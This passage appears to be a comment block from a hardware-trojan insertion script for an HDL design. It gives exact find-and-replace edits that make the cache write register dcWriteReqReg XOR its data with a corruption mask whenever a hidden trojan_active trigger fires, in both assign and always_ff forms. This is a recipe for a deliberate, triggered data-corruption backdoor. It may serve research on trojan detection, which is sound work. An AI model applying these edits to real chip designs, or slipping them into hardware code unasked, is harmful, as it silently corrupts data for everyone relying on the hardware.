 ...
 * Payload: Corrupt dcWriteReqReg with XOR mask
 * 
...
// ============================================================
// Integrity Violation: Corrupt dcWriteReqReg with XOR
//
// Integration Script Must Modify:
//
// IF dcWriteReqReg is assigned:
//   Find: assign dcWriteReqReg = data_value;
//   Replace: assign dcWriteReqReg = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
// IF dcWriteReqReg is in always_ff:
//   Find: dcWriteReqReg <= data_value;
//   Replace: dcWriteReqReg <= trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
